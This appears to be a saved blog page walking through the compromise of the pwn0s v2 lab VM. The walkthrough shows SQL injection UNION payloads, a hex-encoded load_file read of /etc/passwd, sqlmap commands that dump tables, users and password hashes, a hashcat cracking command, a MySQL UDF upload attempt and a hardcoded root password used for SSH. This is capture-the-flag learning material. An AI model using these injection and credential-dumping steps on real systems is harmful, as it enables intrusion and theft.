@@ -1,0 +1,548 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>solving pwn0s v2 - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="pwn0sv2 is version two in the pwn0s series (?), and can be found here at our good friend g0tmi1k&rsquo;s pentest page. I previously did a write up on &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2012/08/09/solving-pwn0s-v2">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Solving Pwn0s V2</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-09T00:56:45-07:00" pubdate data-updated="true">Aug 9<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>pwn0sv2 is version two in the pwn0s series (?), and can be found <a href="http://boot2root.info/">here</a> at our good friend g0tmi1k&rsquo;s pentest page.  I previously did a write up on the first version of pwn0s and enjoyed it, so I was excited to see there was another version available.  Forewarning: obvious spoilers.</p>
+
+<p>The zip comes packaged with a README with your standard disclaimer/info affair, along with the static IP.  10.10.10.100 is the set IP address.  I set my BT5 onto the 10.10.10.1/24 subnet and did a quick scan of the box:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Starting Nmap 6.01 ( http://nmap.org ) at 2012-07-14 18:20 CDT
+</span><span class='line'>Nmap scan report for 10.10.10.100
+</span><span class='line'>Host is up (0.00086s latency).
+</span><span class='line'>Not shown: 998 closed ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (protocol 2.0)
+</span><span class='line'>| ssh-hostkey: 1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
+</span><span class='line'>|_2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
+</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+</span><span class='line'>|_http-title: Welcome to this Site!
+</span><span class='line'>MAC Address: 08:00:27:36:5C:EF (Cadmus Computer Systems)
+</span><span class='line'>Device type: general purpose
+</span><span class='line'>Running: Linux 2.6.X|3.X
+</span><span class='line'>OS CPE: cpe:/o:linux:kernel:2.6 cpe:/o:linux:kernel:3
+</span><span class='line'>OS details: Linux 2.6.38 - 3.0
+</span><span class='line'>Network Distance: 1 hop
+</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:kernel
+</span><span class='line'>
+</span><span class='line'>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'>1   0.86 ms 10.10.10.100</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There&rsquo;s that pesky OpenSSH Debian build; we could try hunting for weak keys, but that looks to be a newer version of OpenSSH and likely not to be susceptible to that vulnerability.  Nonetheless, it may be worth keeping in mind as we move forward.  <a href="http://www.debian.org/security/2008/dsa-1571">Here&rsquo;s</a> a link to the old advisory for the curious.</p>
+
+<p>There also appears to be an HTTP website up.  Browsing around that gives us a couple of forms; /login.php and /register.php.  With so few services open, I&rsquo;m given the impression that this is going to be a web vulnerability.  First thing I do in almost every registration field:</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_sqli.jpg"></p>
+
+<p>And low and behold, we&rsquo;re vulnerable to SQLi.  And away we go.</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_sqli2.jpg"></p>
+
+<p>After playing around with the UNION SELECT&rsquo;s, it finally settled on 8 columns and 4 being the displayed one.  So <code>' UNION SELECT 1,2,3,user(), 4,5,6,7,8;-- -</code></p>
+
+<p>If you try that, you&rsquo;ll notice you can&rsquo;t actually stick the entire thing into the login box.  Busting Burp open will fix that:</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_sqli3.jpg"></p>
+
+<p>Which gives us:</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_sqli4.jpg"></p>
+
+<p>Fantastic!  This means that the mysql daemon is running as root user.  That makes our SQLi attacks much more dangerous; UDF is now available to us.  Lets explore the system a bit more.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>' UNION SELECT 1,2,3,version(),5,6,7,8-- -
+</span><span class='line'>      Welcome 5.1.54-1ubuntu4
+</span><span class='line'>' UNION SELECT 1,2,3,database(),5,6,7,8-- -
+</span><span class='line'>      Welcome ch16
+</span><span class='line'>' UNION SELECT 1,2,3,load_file(/etc/passwd),5,6,7,8-- - 
+</span><span class='line'>      An error occured(...)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looks like they&rsquo;re at the very least escaping slashes.  No problem:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; echo -n '/etc/passwd' | xxd -ps -
+</span><span class='line'>&gt; 2f6574632f706173737764
+</span><span class='line'>' UNION SELECT 1,2,3,load_file(0x2f6574632f706173737764),5,6,7,8-- -
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
+</span><span class='line'>mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
+</span><span class='line'>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>landscape:x:104:110::/var/lib/landscape:/bin/false
+</span><span class='line'>dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash
+</span><span class='line'>&gt; echo -n '/etc/shadow' | xxd -ps -
+</span><span class='line'>&gt; 2f6574632f736861646f77
+</span><span class='line'>' UNION SELECT 1,2,3,load_file(0x2f6574632f736861646f77),5,6,7,8-- -
+</span><span class='line'>&gt; Welcome</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Hm, looks like we can&rsquo;t hit /etc/shadow.  Weird.  Lets move on to rapidly enumerating the back end.  I switched over to sqlmap to give more info on the backend.  We already know the vulnerable form, we know the POST format (from our Burp session), and we know the database (from UNION queries above) so lets plug that in for some interesting stuff.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&pass=bleh&submit=Login&submitted=True' -p 'email' --tables -D 'ch16'
+</span><span class='line'>Database: ch16
+</span><span class='line'>Table: users</span></code></pre></td></tr></table></div></figure>
+
+
+<p>One table.  Let&rsquo;s check it out:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&pass=bleh&submit=Login&submitted=TRUE' -p 'email' --columns -T 'users' --dump    </span></code></pre></td></tr></table></div></figure>
+
+
+<p>This gave me a single user, &lsquo;Dan&rsquo;, with a user level 0 and his hash: <code>c2c4b4e51d9e23c02c15702c136c3e950ba9a4af</code></p>
+
+<p>I let sqlmap run its own cracker against the hash, then dumped it into oclHashCat:<br/>
+<code>cudaHashCat-plus64 -m 300 -a 3 -n 50 --gpu-watchdog=100 --force hash.txt ?l?l?l?l?l?l?l?l</code></p>
+
+<p>I then dumped database users to see what was there, and what the hashes were (assumed sha1(sha1(pass)), but you never know)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&pass=bleh&submit=Login&submitted=TRUE' -p 'email' --users
+</span><span class='line'>database management system users [108]:                                                              
+</span><span class='line'>          [*] 'debian-sys-maint'@'localhost'
+</span><span class='line'>          [*] 'root'@'127.0.0.1'
+</span><span class='line'>          [*] 'root'@'localhost'
+</span><span class='line'>          [*] 'root'@'web'
+</span><span class='line'>          
+</span><span class='line'>&gt; python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&pass=bleh&submit=Login&submitted=TRUE' -p 'email' --passwords
+</span><span class='line'>          [23:11:18] [INFO] fetching database users password hashes
+</span><span class='line'>          [23:11:18] [INFO] the SQL query used returns 4 entries
+</span><span class='line'>          [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"
+</span><span class='line'>          [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"                      
+</span><span class='line'>          [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"                      
+</span><span class='line'>          [23:11:18] [INFO] retrieved: "debian-sys-maint","*9366FE2112E650C8E5523AE337B10A625C727943" </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Pretty much what I expected.  At this point I figured the next best thing to try, with my root privileges and all, is UDF injection.  If you&rsquo;re unfamiliar with UDF&rsquo;s, here&rsquo;s a very brief breakdown: a user defined function is a way to extend the functionality of a database by providing a function that&rsquo;s able to be evaluated by the backend database server.  In our case, we want something akin to an eval() or exec().  This can be done with the lib_mysqludf_sys library.  If you want more information on UDF injection, read <a href="https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf">this</a> fantastic paper from BlackHat 2009 by Damele.</p>
+
+<p>Our attack method is then this: upload the precompiled library into the MySQL plugin directory, create our custom function, and execute some good stuff (passwd, addusr, whatever).  I first needed to know where the plugin directory was.  A quick <a href="https://dev.mysql.com/doc/refman/5.0/en/server-system-variables.html">google</a> of MySQL system variables gives us an answer:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>' UNION SELECT 1,2,3,@@plugin_dir,5,6,7,8-- -
+</span><span class='line'>Welcome /usr/lib/mysql/plugin</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we just need to write our library there and create the functions:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&pass=bleh&submit=Login&submitted=TRUE' -p 'email' --file-write=/lib_mysqludf_sys --file-dest=/usr/lib/mysql/plugin/
+</span><span class='line'>CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
+</span><span class='line'>SELECT * FROM information_schema.routines</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The final SELECT there does not return our newly created function.  According to MySQL documentation, we need INSERT privileges.  Do we have them?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 'root'@'localhost' (administrator) [27]:
+</span><span class='line'>                privilege: ALTER
+</span><span class='line'>                privilege: ALTER ROUTINE
+</span><span class='line'>                privilege: CREATE
+</span><span class='line'>                privilege: CREATE ROUTINE
+</span><span class='line'>                privilege: CREATE TEMPORARY TABLES
+</span><span class='line'>                privilege: CREATE USER
+</span><span class='line'>                privilege: CREATE VIEW
+</span><span class='line'>                privilege: DELETE
+</span><span class='line'>                privilege: DROP
+</span><span class='line'>                privilege: EVENT
+</span><span class='line'>                privilege: EXECUTE
+</span><span class='line'>                privilege: FILE
+</span><span class='line'>                privilege: INDEX
+</span><span class='line'>                privilege: INSERT
+</span><span class='line'>                privilege: LOCK TABLES
+</span><span class='line'>                privilege: PROCESS
+</span><span class='line'>                privilege: REFERENCES
+</span><span class='line'>                privilege: RELOAD
+</span><span class='line'>                privilege: REPLICATION CLIENT
+</span><span class='line'>                privilege: REPLICATION SLAVE
+</span><span class='line'>                privilege: SELECT
+</span><span class='line'>                privilege: SHOW DATABASES
+</span><span class='line'>                privilege: SHOW VIEW
+</span><span class='line'>                privilege: SHUTDOWN
+</span><span class='line'>                privilege: SUPER
+</span><span class='line'>                privilege: TRIGGER
+</span><span class='line'>                privilege: UPDATE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It appears we do.  In fact, it doesn&rsquo;t seem we have write access to anything; we can&rsquo;t even INSERT into any tables.  We&rsquo;ll come back to why this doesn&rsquo;t work in a bit.  For now, I threw a reverse PHP shell on the box for more control.  I used pentestmonkey&rsquo;s great php-reverse-shell, and soon enough had a prompt:</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_shell.jpg"></p>
+
+<p>I&rsquo;m going to cut out a lot of my trial/error in finding some of this stuff, but note that there is a blog in /var/www.  This provides Simple PHP Blog, which just so happens to be <a href="http://www.exploit-db.com/search/?action=search&amp;filter_page=1&amp;filter_description=Simple+PHP+Blog&amp;filter_exploit_text=&amp;filter_author=&amp;filter_platform=0&amp;filter_type=0&amp;filter_lang_id=0&amp;filter_port=&amp;filter_osvdb=&amp;filter_cve=">vulnerable</a> to LFI; so there&rsquo;s another attack vector for the reverse PHP shell.  Also note the mysqld is listening on 127.0.0.1, which rules out that complex exploit David Kennedy <a href="http://www.exploit-db.com/exploits/19092/">wrote</a>.  Not to mention we&rsquo;re not in a real term.</p>
+
+<p>Note that there are no privilege escalation vulnerabilities for that kernel or for that Ubuntu distribution.  MySQL does not appear to be UDF-injectable, and even though it&rsquo;s telling us we&rsquo;re root@localhost, we simply don&rsquo;t have it.  It is also worth nothing that an attempt to drop a shell script in /etc/cron.d/ and adding a cron entry got AppArmor a bit upset.</p>
+
+<p>My next step was to see if there were any vulnerable binaries uploaded.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>find $1 -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2- &gt; /tmp/dump.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This dumped modified files by date, so newest at the top, oldest at the bottom.  After getting through all the modified /proc&rsquo;s, I noticed this monster: fakeroot.  Essentially this emulates a root environment but only allows certain file manipulations.  It can be used to run daemons in an environment that&rsquo;s root-like, but not.  This had to be why my MySQL UDF attempts were not working.  Moving on down the list, I noticed another file: /var/mysqli_connect.php.  Weird, what&rsquo;s a PHP file doing in var?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; cat /var/mysqli_connect.php
+</span><span class='line'>[...]
+</span><span class='line'>// Set the database access information as constants:
+</span><span class='line'>  DEFINE ('DB_USER', 'root');
+</span><span class='line'>  DEFINE ('DB_PASSWORD', 'root@ISIntS');
+</span><span class='line'>  DEFINE ('DB_HOST', 'localhost');
+</span><span class='line'>  DEFINE ('DB_NAME', 'ch16');
+</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Oh.  That&rsquo;s&hellip;it?  Really?  Knowing that root was permitted to ssh in, I quickly gave it a shot:</p>
+
+<p><img class="center" src="/images/posts/2012/pwnos2_root.jpg"></p>
+
+<p>Yup.  That was it.  I suppose the idea here is that incompetent developers can hard code root passwords into arbitrary PHP files laying around the system, but it just seems like more of a scavenger hunt in the end.  I was really hoping there was some obscure vulnerability in a binary, or some fun MySQL UDF injection I could&rsquo;ve done.</p>
+
+<p>All in all, fun, but once you&rsquo;ve got a shell its an exercise in frustration.  Can&rsquo;t say I didn&rsquo;t learn anything though.</p>
+
+<p>Note:  If you&rsquo;re running BackTrack5 and need certain VirtualBox features (bidirectional clipboard, shared folders, etc.), you&rsquo;ll need to prepare kernel headers first.  Follow <a href="http://www.backtrack-linux.org/wiki/index.php/Preparing_Kernel_Headers">these</a> instructions before installing Guest Additions.  If you&rsquo;ve got it installed, just reinstall them.  You&rsquo;ll know it&rsquo;s successful if you don&rsquo;t get &lsquo;could not find kernel headers&rsquo; errors.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-09T00:56:45-07:00" pubdate data-updated="true">Aug 9<span>th</span>, 2012</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>, <a class='category' href='/blog/categories/walkthrough/'>walkthrough</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2012/08/09/solving-pwn0s-v2/" data-via="" data-counturl="http://hatRiot.github.io/blog/2012/08/09/solving-pwn0s-v2/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2012/06/07/solving-pwn0s/" title="Previous Post: solving pwn0s">&laquo; solving pwn0s</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2012/10/03/fastspy-buffer-overflow/" title="Next Post: FastSpy 2.1.1 Buffer Overflow">FastSpy 2.1.1 Buffer Overflow &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
